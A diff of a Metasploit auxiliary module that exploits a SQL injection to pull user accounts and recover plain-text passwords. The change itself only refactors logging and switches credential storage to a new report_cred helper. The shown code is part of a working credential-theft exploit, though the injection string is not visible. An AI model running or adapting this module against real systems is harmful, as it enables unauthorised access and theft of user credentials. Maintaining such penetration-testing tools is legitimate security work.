@@ -119,7 +119,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    print_status("#{peer} - Exploiting sqli to extract users information...")
+    print_status("Exploiting sqli to extract users information...")
     mark = Rex::Text.rand_text_alpha(8 + rand(5))
     rand = Rex::Text.rand_text_numeric(2)
     separator = Rex::Text.rand_text_alpha(5 + rand(5))
@@ -134,21 +134,21 @@ class Metasploit3 < Msf::Auxiliary
     data = do_sqli(injection, mark)
 
     if data.blank?
-      print_error("#{peer} - Error exploiting sqli")
+      print_error("Error exploiting sqli")
       return
     end
 
     @users = []
     @plain_passwords = []
 
-    print_status("#{peer} - Parsing extracted data...")
+    print_status("Parsing extracted data...")
     parse_users(data, mark, separator)
 
     if @users.empty?
-      print_error("#{peer} - Users not found")
+      print_error("Users not found")
       return
     else
-      print_good("#{peer} - #{@users.length} users found!")
+      print_good("#{@users.length} users found!")
     end
 
     users_table = Rex::Ui::Text::Table.new(
@@ -175,20 +175,45 @@ class Metasploit3 < Msf::Auxiliary
         @plain_passwords[i] << " (ISO-8859-1 hex chars)"
       end
 
-      report_auth_info({
-       :host => rhost,
-       :port => rport,
-       :user => @users[i][0],
-       :pass => @plain_passwords[i],
-       :type => "password",
-       :sname => (ssl ? "https" : "http"),
-       :proof => "Leaked encrypted password from #{@users[i][3]}: #{@users[i][1]}:#{@users[i][2]}"
-      })
+      report_cred(
+        ip: rhost,
+        port: rport,
+        user: @users[i][0],
+        password: @plain_passwords[i],
+        service_name: (ssl ? "https" : "http"),
+        proof: "Leaked encrypted password from #{@users[i][3]}: #{@users[i][1]}:#{@users[i][2]}"
+      )
 
       users_table << [@users[i][0], @users[i][1], @users[i][2], @plain_passwords[i], user_type(@users[i][3])]
     end
 
     print_line(users_table.to_s)
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def user_type(database)
